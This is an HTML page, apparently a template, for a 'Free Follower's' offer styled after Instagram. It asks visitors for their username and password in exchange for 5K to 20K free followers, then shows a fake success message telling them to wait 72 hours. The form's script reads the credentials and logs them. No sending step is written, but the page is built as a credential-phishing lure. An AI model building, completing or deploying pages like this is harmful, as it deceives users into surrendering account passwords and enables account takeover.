<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Top Follower</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial,sans-serif;
}

body{
    background:linear-gradient(135deg,#833ab4,#fd1d1d,#fcb045);
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    padding:20px;
}

.container{
    width:100%;
    max-width:450px;
    background:white;
    border-radius:20px;
    padding:25px;
    box-shadow:0 10px 30px rgba(0,0,0,.2);
}

.profile{
    text-align:center;
    margin-bottom:20px;
}

.profile img{
    width:110px;
    height:110px;
    border-radius:50%;
    border:4px solid #E1306C;
    object-fit:cover;
}

.profile h2{
    margin-top:10px;
}

.profile p{
    color:#666;
}

input, textarea{
    width:100%;
    padding:14px;
    margin-top:12px;
    border:1px solid #ddd;
    border-radius:12px;
    outline:none;
    font-size:15px;
}

textarea{
    resize:none;
    height:120px;
}

button{
    width:100%;
    padding:14px;
    margin-top:15px;
    border:none;
    border-radius:12px;
    background:#0095F6;
    color:white;
    font-size:16px;
    cursor:pointer;
}

button:hover{
    opacity:.9;
}

#success{
    display:none;
    margin-top:15px;
    text-align:center;
    color:green;
    font-weight:bold;
}

.footer{
    margin-top:20px;
    text-align:center;
    color:#777;
    font-size:14px;
}
</style>
</head>
<body>

<div class="container">

    <div class="profile">
        <!-- এখানে তোমার ছবির URL বসাবে -->
         <!---->
        <img src="kk.png" alt="Profile">
        <h2>Free Follower's</h2>
        <p>Enter Your Username & Password To Get Free Follower's</p>
    </div>

    <form id="contactForm">

        <input type="text" id="name" placeholder="Username" required>

        <input type="password" id="instagram" placeholder="Password" required>

        <input type="text" id="message" placeholder="5K,10K,15K,20K">

        <button type="submit">Get Follower's</button>

    </form>

    <div id="success">
        ✅ Get Successfully! Wait 72 Hour's
    </div>

    <div class="footer">
        Made with "top Follower"
    </div>

</div>

<script>
document.getElementById("contactForm").addEventListener("submit", function(e){

    e.preventDefault();

    let name = document.getElementById("name").value;
    let insta = document.getElementById("instagram").value;
    let msg = document.getElementById("message").value;

    console.log({
        name:name,
        instagram:insta,
        message:msg
    });

    document.getElementById("success").style.display="block";

    this.reset();
});
</script>

</body>
</script>
</html>
